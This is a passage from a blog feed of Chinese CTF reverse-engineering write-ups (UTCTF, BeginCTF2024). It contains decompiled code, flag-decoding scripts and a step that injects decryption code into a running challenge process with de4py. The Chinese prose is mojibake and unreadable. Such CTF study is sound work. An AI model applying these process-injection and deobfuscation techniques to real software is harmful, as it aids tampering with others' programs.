class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x01</span></span><br><span class="line">]</span><br><span class="line">key = [key[i] - <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2F</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        now = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> enc[indexs[<span class="built_in">id</span>][i]] &amp; (<span class="number">1</span> &lt;&lt; key[<span class="number">8</span> * <span class="built_in">id</span> + j]):</span><br><span class="line">                now |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">        enc[indexs[<span class="built_in">id</span>][i]] = now</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(s), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># utflag&#123;i_got_the_need_for_amdahls_law&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="In-The-Dark-unsolved-æ··æ·†-æ¸¸æˆé€†å‘"><a href="#In-The-Dark-unsolved-æ··æ·†-æ¸¸æˆé€†å‘" class="headerlink" title="In The Dark(unsolved) | æ··æ·† | æ¸¸æˆé€†å‘"></a>In The Dark(unsolved) | æ··æ·† | æ¸¸æˆé€†å‘</h2><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªæ²¡æœ‰å›¾å½¢åŒ–ç•Œé¢çš„æ¸¸æˆ å¯ä»¥è¾“å…¥wasdè¿›è¡Œæ“ä½œ ä½†æ˜¯ç”±äºä»£ç è¿›è¡Œäº†æ··æ·†æ‰€ä»¥å‡ ä¹ä¸å¯èƒ½é€šè¿‡é™æ€åˆ†æå¾—åˆ°æ¸¸æˆé€»è¾‘ å¬å¤§ä½¬è¯´å¯ä»¥ç”¨ALF++é€šæ€æ¸¸æˆé€†å‘ ä»¥åç ”ç©¶ä¸€ä¸‹</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
      </tags>
  </entry>
  <entry>
    <title>BeginCTF2024é€†å‘æ–¹å‘wp</title>
    <url>/2024/02/23/BeginCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
    <content><![CDATA[<p>å‚èµ›ID:1K0CT</p>
<span id="more"></span>

<h2 id="superguesser-åŠ¨æ€è°ƒè¯•"><a href="#superguesser-åŠ¨æ€è°ƒè¯•" class="headerlink" title="superguesser | åŠ¨æ€è°ƒè¯•"></a>superguesser | åŠ¨æ€è°ƒè¯•</h2><p>é™æ€åˆ†æå‘ç°å‡½æ•°å…¨éƒ¨è¢«æ··æ·† åœ¨å…¥å£ä¸‹æ–­ç‚¹æ­¥è¿‡å‡½æ•°ç›´åˆ°è¿›å…¥è¢«è¿˜åŸçš„å‡½æ•° æ‰¾åˆ°æ ¸å¿ƒåŠ å¯†é€»è¾‘:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_401530</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 <span class="built_in">stack</span>; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// zf</span></span><br><span class="line">  __int64 (*v2)(<span class="type">void</span>); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// of</span></span><br><span class="line"></span><br><span class="line">  (loc_46EB33)();</span><br><span class="line">  _disable();</span><br><span class="line">  (loc_46EB77)();</span><br><span class="line">  (loc_46EBB4)();</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    JUMPOUT(<span class="number">0x401548</span>i64);</span><br><span class="line">  (loc_46EBF7)();</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">96</span>) = <span class="number">81</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">95</span>) = <span class="number">81</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">94</span>) = <span class="number">82</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">93</span>) = <span class="number">95</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">92</span>) = <span class="number">89</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">91</span>) = <span class="number">67</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">90</span>) = <span class="number">93</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">89</span>) = <span class="number">95</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">88</span>) = <span class="number">89</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">87</span>) = <span class="number">73</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">86</span>) = <span class="number">90</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">85</span>) = <span class="number">89</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">84</span>) = <span class="number">86</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">83</span>) = <span class="number">46</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">82</span>) = <span class="number">38</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">81</span>) = <span class="number">29</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">80</span>) = <span class="number">42</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">79</span>) = <span class="number">55</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">78</span>) = <span class="number">26</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">77</span>) = <span class="number">39</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">76</span>) = <span class="number">41</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">75</span>) = <span class="number">23</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">74</span>) = <span class="number">40</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">73</span>) = <span class="number">36</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">72</span>) = <span class="number">42</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">71</span>) = <span class="number">56</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">70</span>) = <span class="number">37</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">69</span>) = <span class="number">33</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">68</span>) = <span class="number">61</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">67</span>) = <span class="number">15</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">66</span>) = <span class="number">50</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">65</span>) = <span class="number">58</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">64</span>) = <span class="number">60</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">63</span>) = <span class="number">61</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">62</span>) = <span class="number">54</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">61</span>) = <span class="number">51</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">60</span>) = <span class="number">42</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">59</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">24</span>) = (loc_46EC76)(<span class="built_in">stack</span> - <span class="number">96</span>);</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">25</span>) = <span class="number">51</span>;</span><br><span class="line">  v2 = (loc_46ECB3)();</span><br><span class="line">  __outbyte(<span class="number">0x2F</span>u, v2);</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">26</span>) = v2();</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">40</span>) = *(<span class="built_in">stack</span> - <span class="number">24</span>) - <span class="number">1</span>i64;</span><br><span class="line">  (loc_46ECF6)();</span><br><span class="line">  (loc_46ED38)();</span><br><span class="line">  v3 = alloca((loc_46ED75)());</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">48</span>) = alloc();</span><br><span class="line">  (scanf_0)(v4, *(<span class="built_in">stack</span> - <span class="number">48</span>));</span><br><span class="line">  (loc_46EE32)();</span><br><span class="line">  (loc_46EEB1)();</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    JUMPOUT(<span class="number">0x401651</span>i64);</span><br><span class="line">  <span class="keyword">while</span> ( *(<span class="built_in">stack</span> - <span class="number">20</span>) &lt; *(<span class="built_in">stack</span> - <span class="number">24</span>) )</span><br><span class="line">    *(*(<span class="built_in">stack</span> - <span class="number">48</span>) + (*(<span class="built_in">stack</span> - <span class="number">20</span>))++) ^= *(<span class="built_in">stack</span> - <span class="number">20</span>) + *(<span class="built_in">stack</span> - <span class="number">25</span>) + <span class="number">17</span> * *(<span class="built_in">stack</span> - <span class="number">26</span>);<span class="comment">// i + ? + 17 * ??</span></span><br><span class="line">  <span class="keyword">if</span> ( !(cmp)(*(<span class="built_in">stack</span> - <span class="number">48</span>), <span class="built_in">stack</span> - <span class="number">96</span>, *(<span class="built_in">stack</span> - <span class="number">24</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    (loc_46F030)();</span><br><span class="line">    JUMPOUT(<span class="number">0x4016E8</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  (loc_46EF73)();</span><br><span class="line">  <span class="keyword">return</span> (loc_46EFF3)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ¨è°ƒå‘ç°<code>stack-48</code>å¤„å­˜æ”¾çš„å°±æ˜¯è¾“å…¥çš„flag è€Œåªæœ‰è¿™ä¸€å¤„åŠ å¯† ç”±äºä¸ç¡®å®š<code>*(stack - 26)</code>çš„å€¼æ˜¯å¦å› ä¸ºåè°ƒè¯•æ‰‹æ®µè¢«ä¿®æ”¹ æ•…ç”¨çˆ†ç ´æ–¹æ³•è§£flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">81</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">93</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">73</span>, <span class="number">90</span>, <span class="number">89</span>, <span class="number">86</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">29</span>, <span class="number">42</span>, <span class="number">55</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">42</span>, <span class="number">56</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">61</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">42</span>]</span><br><span class="line"><span class="keyword">for</span> ran <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>((enc[i] ^ (i + <span class="number">0x33</span> + <span class="number">17</span> * ran)) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="number">5</span>] == <span class="string">&quot;begin&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="comment"># begin&#123;debugging_is_an_anathor_choice&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="ezpython-æ³¨å…¥è§£æ³•"><a href="#ezpython-æ³¨å…¥è§£æ³•" class="headerlink" title="ezpython | æ³¨å…¥è§£æ³•"></a>ezpython | æ³¨å…¥è§£æ³•</h2><p>ç”¨pyinstxtractorè§£åŒ…å‡ºçš„keyå’Œencæ— æ³•é€šè¿‡sm4è§£å¯†å¾—åˆ°flag æ•…ä½¿ç”¨åŸç¨‹åºçš„ç¯å¢ƒè¿›è¡Œè§£å¯† åŸç¨‹åºåç¼–è¯‘åä¸»è¦é€»è¾‘:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> key, enc</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_pkcs7</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;PKCS#7å¡«å……&quot;&quot;&quot;</span></span><br><span class="line">    padding_len = <span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span></span><br><span class="line">    padding = <span class="built_in">bytes</span>([padding_len] * padding_len)</span><br><span class="line">    <span class="keyword">return</span> data + padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpad_pkcs7</span>(<span class="params">padded_data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;PKCS#7å»å¡«å……&quot;&quot;&quot;</span></span><br><span class="line">    padding_len = padded_data[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> padded_data[:-padding_len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM4</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.gmsm4 = sm4.CryptSM4()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encryptSM4</span>(<span class="params">self, encrypt_key, value</span>):</span><br><span class="line">        gmsm4 = self.gmsm4</span><br><span class="line">        gmsm4.set_key(encrypt_key.encode(), sm4.SM4_ENCRYPT)</span><br><span class="line">        padded_value = pad_pkcs7(value.encode())</span><br><span class="line">        encrypt_value = gmsm4.crypt_ecb(padded_value)</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(encrypt_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&quot;...&quot;</span>)</span><br><span class="line">    sm4_instance = SM4()</span><br><span class="line">    flag_1 = sm4_instance.encryptSM4(key, flag)</span><br><span class="line">    <span class="keyword">if</span> flag_1 == enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed&quot;</span>)</span><br></pre></td></tr></table></figure>



<p> åœ¨powershellå¯åŠ¨é¢˜ç›®ç¨‹åº(ç”¨cmdæˆ–è€…ç›´æ¥å¯åŠ¨è²Œä¼¼ä¸è¡Œ) æ‰¾åˆ°è¯¥ç¨‹åºçš„pid ä½¿ç”¨de4pyçš„PyShellåŠŸèƒ½å°†ä»¥ä¸‹è§£å¯†ä»£ç æ³¨å…¥åˆ°ç¨‹åº:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decryptSM4</span>(<span class="params">self, encrypt_key, enc</span>):</span><br><span class="line">    gmsm4 = self.gmsm4</span><br><span class="line">    gmsm4.set_key(encrypt_key.encode(), sm4.SM4_DECRYPT)</span><br><span class="line">    encrypt_value = base64.b64decode(enc)</span><br><span class="line">    decrypt_value = gmsm4.crypt_ecb(encrypt_value)</span><br><span class="line">    <span class="keyword">return</span> unpad_pkcs7(decrypt_value).decode()</span><br><span class="line"></span><br><span class="line">SM4.decrypt = decryptSM4</span><br><span class="line">sm4_new = SM4()</span><br><span class="line"><span class="built_in">print</span>(sm4_new.decrypt(key, enc))</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœ:<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110630.png"></p>
<h3 id="24-3-23æ›´æ–°æ­£å¸¸è§£"><a href="#24-3-23æ›´æ–°æ­£å¸¸è§£" class="headerlink" title="24&#x2F;3&#x2F;23æ›´æ–°æ­£å¸¸è§£"></a>24&#x2F;3&#x2F;23æ›´æ–°æ­£å¸¸è§£</h3><p>â€‹	â€“åŸé¢˜é­”æ”¹äº†å›½å¯†åº“</p>
<h2 id="goforfun-goè¯­è¨€é€†å‘"><a href="#goforfun-goè¯­è¨€é€†å‘" class="headerlink" title="goforfun | goè¯­è¨€é€†å‘"></a>goforfun | goè¯­è¨€é€†å‘</h2><p>ç¬¬ä¸€ä¸ªåŠ å¯†çš„æ ¸å¿ƒç‰¹å¾:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">255</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= <span class="number">0x100</span> )</span><br><span class="line">    runtime_panicIndex();</span><br><span class="line">  *(box + i) = <span class="number">-1</span> - i;</span><br><span class="line">&#125;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( count &lt; <span class="number">256</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = *(box + count);</span><br><span class="line">  v9 = count;</span><br><span class="line">  v10 = count - <span class="number">12</span> * (((<span class="number">2863311531LL</span> * count) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 &gt;= <span class="number">0xC</span> )</span><br><span class="line">    runtime_panicIndex();</span><br><span class="line">  v7 += v35[v10] + v8;</span><br><span class="line">  *(box + v9) = *(box + v7);</span><br><span class="line">  *(box + v7) = v8;</span><br><span class="line">  count = v9 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">sub_462C00(&amp;PRGA_result, box);</span><br><span class="line">flag_context = v4;</span><br><span class="line">lenth_of_context = v34;</span><br><span class="line">v26 = v11;</span><br><span class="line">main_PRGA(PRGA_result);</span><br></pre></td></tr></table></figure>

<p>Sboxåˆå§‹åŒ– PRGA ä½†æ˜¯ä¸æ˜¯æ™®é€šçš„RC4åŠ å¯† è¿›å…¥PRGAå‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __usercall main_PRGA@&lt;eax&gt;(<span class="type">char</span> table)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// bp</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+12h] [ebp-2h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [esp+14h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(*__readfsdword(runtime_tls_g) + <span class="number">8</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  result = runtime_makeslice(&amp;uint8, STACK[<span class="number">0x11C</span>], STACK[<span class="number">0x11C</span>]);</span><br><span class="line">  v2 = STACK[<span class="number">0x11C</span>];</span><br><span class="line">  v3 = STACK[<span class="number">0x118</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(&amp;table + (v5 + <span class="number">1</span>));</span><br><span class="line">    v8 = v7 + v6;</span><br><span class="line">    *(&amp;table + (v5 + <span class="number">1</span>)) = *(&amp;table + (v7 + v6));</span><br><span class="line">    *(&amp;table + (v7 + v6)) = v7;</span><br><span class="line">    *(result + v4) = *(&amp;table + (v7 + *(&amp;table + (v5 + <span class="number">1</span>)))) ^ *(v3 + v4) ^ <span class="number">0x2F</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    v2 = STACK[<span class="number">0x11C</span>];</span><br><span class="line">    ++v5;</span><br><span class="line">    v6 = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  STACK[<span class="number">0x124</span>] = result;</span><br><span class="line">  STACK[<span class="number">0x128</span>] = v2;</span><br><span class="line">  STACK[<span class="number">0x12C</span>] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ¨è°ƒå‘ç°<code>v3</code>å­˜æ”¾çš„å°±æ˜¯è¾“å…¥çš„flagå»é™¤begin{}åŒ…è£¹çš„å†…å®¹ æ‰€ä»¥åŠ å¯†åªå…³å¿ƒå’Œå…¶å¼‚æˆ–çš„ä¸œè¥¿ åœ¨æœ€åå¼‚æˆ–æ­¥éª¤ä¸‹çŠ¶å†µæ–­ç‚¹ è¾“å‡ºå­˜æ”¾å¼‚æˆ–çš„æ•°å­—çš„å¯„å­˜å™¨:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639.png" alt="image-20240206140321081"></p>
<p>å¾—åˆ°å¼‚æˆ–å†…å®¹:</p>
<p><code>xor_key = [i ^ 0x2f for i in [132, 14, 121, 193, 41, 61, 231, 134, 147, 244, 180, 102, 100, 175, 25, 151, 133, 7, 230, 74, 200, 3, 55]]</code></p>
<p>æœ€åä¸€å¤„åŠ å¯†çš„æ ¸å¿ƒç‰¹å¾:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-1.png" alt="image-20240206140631616"></p>
<p>ä»64é•¿åº¦çš„è¡¨ä¸­æŒ‰ç¬¬äºŒå¤„åŠ å¯†å¾—åˆ°çš„ç»“æœä¸ºä¸‹æ ‡å–å…ƒç´  æœ€åå’Œå¯†æ–‡æ¯”è¾ƒ çŒœæµ‹æ˜¯æ¢è¡¨base64</p>
<p>ç¬¬äºŒå¤„åŠ å¯†:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v20 = main_byteArrayToBigInt(result, lenth_2);</span><br><span class="line">v22 = main_bigIntModToArray(str_head);</span><br></pre></td></tr></table></figure>

<p>åŠ¨è°ƒå‘ç°ç¬¬ä¸€ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯å°†ç¬¬ä¸€å¤„åŠ å¯†å¾—åˆ°çš„ç»“æœæŒ‰å°ç«¯åºå‚¨å­˜ä¸ºGoä¸­çš„ä¸€ç§å¤§æ•´å‹æ•°æ®(æ²¡æœ‰ä½æ•°ä¸Šé™ èƒ½å‚¨å­˜å¤šå¤§å–å†³äºè®¡ç®—æœº)</p>
<p>ç¬¬äºŒä¸ªå‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int128 __golang <span class="title function_">main_bigIntModToArray</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> *mod_result_instanc; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> now_result; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> origin_data; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> count_1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> add_; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> *final_procees; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> *result_; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> *v12; <span class="comment">// [esp+14h] [ebp-64h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [esp+18h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+20h] [ebp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// [esp+24h] [ebp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [esp+28h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+28h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> mod_num_2; <span class="comment">// [esp+2Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> mod_num; <span class="comment">// [esp+30h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+44h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v22[<span class="number">4</span>]; <span class="comment">// [esp+48h] [ebp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> mod_n[<span class="number">4</span>]; <span class="comment">// [esp+58h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> be_moded_instanc[<span class="number">4</span>]; <span class="comment">// [esp+68h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [esp+78h] [ebp+0h] BYREF</span></span><br><span class="line">  __int128 result; <span class="comment">// [esp+80h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(*__readfsdword(runtime_tls_g) + <span class="number">8</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  mod_result_instanc = a1;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( mod_result_instanc[<span class="number">2</span>] )</span><br><span class="line">      v5 = *mod_result_instanc ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v17 = v2;</span><br><span class="line">    v21 = v3;</span><br><span class="line">    LOBYTE(be_moded_instanc[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;be_moded_instanc[<span class="number">1</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    mod_num = <span class="number">64</span>;</span><br><span class="line">    LOBYTE(mod_n[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    mod_n[<span class="number">1</span>] = &amp;mod_num;</span><br><span class="line">    mod_n[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    mod_n[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    result_ = math_big__Int_Mod(be_moded_instanc, mod_result_instanc, mod_n);</span><br><span class="line">    <span class="keyword">if</span> ( result_[<span class="number">2</span>] )</span><br><span class="line">      now_result = *result_[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      now_result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *result_ )</span><br><span class="line">      origin_data = -now_result;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      origin_data = now_result;</span><br><span class="line">    count_1 = i + <span class="number">1</span>;</span><br><span class="line">    add_ = v17;</span><br><span class="line">    <span class="keyword">if</span> ( v17 &lt; i + <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = origin_data;</span><br><span class="line">      v12 = runtime_growslice(v21, i + <span class="number">1</span>, v17, <span class="number">1</span>, &amp;<span class="type">int</span>);</span><br><span class="line">      count_1 = 